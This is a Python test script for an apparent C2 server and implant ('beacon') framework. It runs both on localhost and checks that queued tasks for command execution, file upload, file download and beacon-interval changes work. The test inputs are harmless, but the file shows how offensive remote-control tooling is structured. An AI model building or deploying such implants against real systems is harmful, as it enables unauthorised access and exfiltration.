#!/usr/bin/python3

"""End-to-end test for the beacon architecture.

Starts the C2 server and implant in-process, queues tasks via the
in-memory task queue, and verifies results come back.
"""

import base64
import os
import ssl
import sys
import tempfile
import threading
import time

# Add parent to path so we can import from Beacon/
sys.path.insert(0, os.path.dirname(__file__))

import c2_beacon
import implant_beacon


def wait_for(condition, timeout=15, interval=0.3):
    """Poll until condition() is truthy or timeout."""
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = condition()
        if result:
            return result
        time.sleep(interval)
    return None


def main():
    passed = 0
    failed = 0

    # ── Start C2 server (Flask in a thread) ──────────────────────────────
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain(c2_beacon.SRV_CERT, c2_beacon.SRV_KEY)
    ssl_ctx.load_verify_locations(c2_beacon.CA_CERT)
    ssl_ctx.verify_mode = ssl.CERT_REQUIRED

    server_thread = threading.Thread(
        target=lambda: c2_beacon.app.run(
            host="127.0.0.1", port=9444, ssl_context=ssl_ctx, use_reloader=False
        ),
        daemon=True,
    )
    server_thread.start()
    time.sleep(1)  # let Flask bind

    # ── Start implant (in a thread, pointed at our test port) ────────────
    implant_beacon.C2_URL = "https://localhost:9444"
    implant_beacon.BEACON_INTERVAL = 1  # fast polling for tests

    implant_thread = threading.Thread(target=implant_beacon.beacon_loop, daemon=True)
    implant_thread.start()

    # ── Wait for implant to register ─────────────────────────────────────
    def implant_registered():
        return list(c2_beacon.implants.keys()) if c2_beacon.implants else None

    ids = wait_for(implant_registered)
    if ids:
        implant_id = ids[0]
        print(f"[PASS] Implant registered: {implant_id[:12]}...")
        passed += 1
    else:
        print("[FAIL] Implant did not register within timeout")
        failed += 1
        sys.exit(1)

    # ── Test 1: Execute ──────────────────────────────────────────────────
    c2_beacon.queue_task(implant_id, "execute", {"command": "echo hello_beacon"})

    def execute_result():
        results = c2_beacon.result_store.get(implant_id, [])
        return [r for r in results if r.get("type") == "execute"]

    results = wait_for(execute_result)
    if results and results[0].get("ok") and "hello_beacon" in results[0].get("output", ""):
        print(f"[PASS] Execute: got 'hello_beacon' in output")
        passed += 1
    else:
        print(f"[FAIL] Execute: unexpected result {results}")
        failed += 1
    c2_beacon.result_store[implant_id].clear()

    # ── Test 2: Upload ───────────────────────────────────────────────────
    upload_file = tempfile.NamedTemporaryFile(delete=False, suffix="_beacon_test.txt")
    upload_file.close()
    test_data = b"beacon upload test data"
    encoded = base64.b64encode(test_data).decode("utf-8")

    c2_beacon.queue_task(implant_id, "upload", {
        "filename": upload_file.name,
        "file": encoded,
    })

    def upload_result():
        results = c2_beacon.result_store.get(implant_id, [])
        return [r for r in results if r.get("type") == "upload"]

    results = wait_for(upload_result)
    if results and results[0].get("ok"):
        with open(upload_file.name, "rb") as f:
            written = f.read()
        if written == test_data:
            print(f"[PASS] Upload: file written correctly ({len(written)} bytes)")
            passed += 1
        else:
            print(f"[FAIL] Upload: file content mismatch")
            failed += 1
    else:
        print(f"[FAIL] Upload: unexpected result {results}")
        failed += 1
    os.unlink(upload_file.name)
    c2_beacon.result_store[implant_id].clear()

    # ── Test 3: Download ─────────────────────────────────────────────────
    download_file = tempfile.NamedTemporaryFile(delete=False, suffix="_beacon_dl.txt")
    download_file.write(b"beacon download test")
    download_file.close()

    c2_beacon.queue_task(implant_id, "download", {"filepath": download_file.name})

    def download_result():
        results = c2_beacon.result_store.get(implant_id, [])
        return [r for r in results if r.get("type") == "download"]

    results = wait_for(download_result)
    if results and results[0].get("ok"):
        data = base64.b64decode(results[0]["data"])
        if data == b"beacon download test":
            print(f"[PASS] Download: got correct file contents ({len(data)} bytes)")
            passed += 1
        else:
            print(f"[FAIL] Download: content mismatch")
            failed += 1
    else:
        print(f"[FAIL] Download: unexpected result {results}")
        failed += 1
    os.unlink(download_file.name)
    c2_beacon.result_store[implant_id].clear()

    # ── Test 4: Set interval ─────────────────────────────────────────────
    c2_beacon.queue_task(implant_id, "set_interval", {"interval": 10})

    def interval_result():
        results = c2_beacon.result_store.get(implant_id, [])
        return [r for r in results if r.get("type") == "set_interval"]

    results = wait_for(interval_result)
    if results and results[0].get("ok"):
        print(f"[PASS] Set interval: acknowledged")
        passed += 1
    else:
        print(f"[FAIL] Set interval: unexpected result {results}")
        failed += 1

    # ── Summary ──────────────────────────────────────────────────────────
    print(f"\n{'='*40}")
    print(f"Results: {passed} passed, {failed} failed")
    print(f"{'='*40}")
    sys.exit(1 if failed else 0)


if __name__ == "__main__":
    main()
